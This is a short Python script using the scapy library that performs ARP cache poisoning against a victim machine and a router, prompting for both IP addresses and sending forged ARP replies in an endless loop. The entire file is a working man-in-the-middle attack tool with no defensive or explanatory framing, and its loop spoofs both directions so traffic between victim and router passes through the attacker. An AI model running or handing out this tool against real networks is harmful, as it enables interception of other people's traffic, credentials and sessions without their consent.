from scapy.all import Ether, ARP, sendp, srp
import sys
    
def get_mac_address(ip):
    """
    Get the MAC address of a given IP address using ARP request."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answ = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answ[0][1].hwsrc

# ipToSpoof = "192.168.56.102" # IP address of the target machine (the one we want to spoof)
def arp_poison(ipToSpoof, ipVictim):
    """
    Perform ARP poisoning
    """
    ARP_packet = ARP(op =2, psrc = ipToSpoof,
                     pdst = ipVictim, hwdst = get_mac_address(ipVictim))
    sendp(ARP_packet, iface="en0", verbose=False)

# TODO: figure out how to perform scanning on a NAT network
# Right now we request user input
victim_ip = input("Enter the IP address of the victim: ")
router_ip = input("Enter the IP address of the router: ")
packet_count = 0

while True:
    arp_poison(router_ip, victim_ip)
    arp_poison(victim_ip, router_ip)
    packet_count += 2
    print(f"[+] Number of packet sent: {packet_count}")
    sys.stdout.write("\r[+] Spoofing " + victim_ip + " and " + router_ip)
    sys.stdout.flush()
